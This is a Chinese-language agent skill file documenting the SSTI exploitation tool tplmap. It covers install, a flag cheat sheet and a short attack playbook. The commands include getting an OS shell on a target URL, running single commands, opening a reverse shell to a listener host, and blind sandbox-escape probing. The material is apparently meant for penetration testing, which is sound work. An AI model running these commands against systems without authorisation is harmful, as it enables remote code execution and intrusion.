---
name: tplmap-ssti
description: 渗透工具 skill:tplmap 的安装、参数速查与攻击场景 playbook。当任务涉及 Web应用漏洞利用 需要调用 tplmap 时使用。
---

# tplmap

- 攻击大类:C09 Web应用漏洞利用
- 上游仓库:https://github.com/epinna/tplmap
- 上游 License:GPL-3.0(本 SKILL.md 以 Apache-2.0 二次开源,上游版权归原项目所有)

## 安装

```bash
git clone https://github.com/epinna/tplmap && cd tplmap && pip install -r requirements.txt
```

## 参数速查

| 参数 / 命令 | 说明 |
| --- | --- |
| `python tplmap.py -u 'https://t.com/hello?name=john'` | SSTI 检测+利用 |
| `--data='name=john'` | POST |
| `--os-shell` | 系统 shell |
| `--os-cmd=id` | 单命令 |
| `--reverse-shell host 4444` | 反弹 |
| `-e jinja2/twig` | 指定引擎 |
| `--level 5` | 盲注深度 |

## 攻击场景 Playbook

### SSTI 直取系统命令

```bash
python tplmap.py -u 'https://target/profile?tpl=hello' --os-shell
# 自动识别 Jinja2/Twig/Freemarker 等引擎并给出 RCE
```

### 沙盒逃逸探测

```bash
python tplmap.py -u URL --level 5  # 深度盲注模式测无回显场景
```

## 注意事项

覆盖 15+ 模板引擎;Jinja2/Twig 下默认直接可 RCE,沙盒模式用 --level 盲打。
